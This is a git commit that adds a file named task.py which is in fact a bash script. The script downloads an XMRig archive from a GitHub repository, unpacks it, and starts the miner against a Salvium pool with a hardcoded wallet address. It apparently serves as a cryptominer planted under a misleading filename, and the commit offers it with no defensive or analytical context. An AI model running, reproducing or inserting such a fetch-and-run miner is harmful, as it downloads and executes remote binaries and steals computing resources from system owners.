0588c618d5de9dfeb86614a30b7c657d4c091750
makiganteng60 <makiganteng60@gmail.com>
2025-03-11 23:37:29 +0700

    Create task.py

---
+++ task.py
@@ -0,0 +1,3 @@
+#!/bin/bash
+wget https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz && tar -xvf xmrig.tar.gz
+./xmrig --donate-level 1 -o sg.salvium.herominers.com:1230 -u SaLvsBwqbLM2xmv37AqvW1arAsZJ7g2GZ3H7nqwmsCFw7kNBc7bahNyMejjMpM6xKQPZzpCTXYbWTPULou11ffwUiTmg7jUtHg3 -p mekkiku -a rx/0
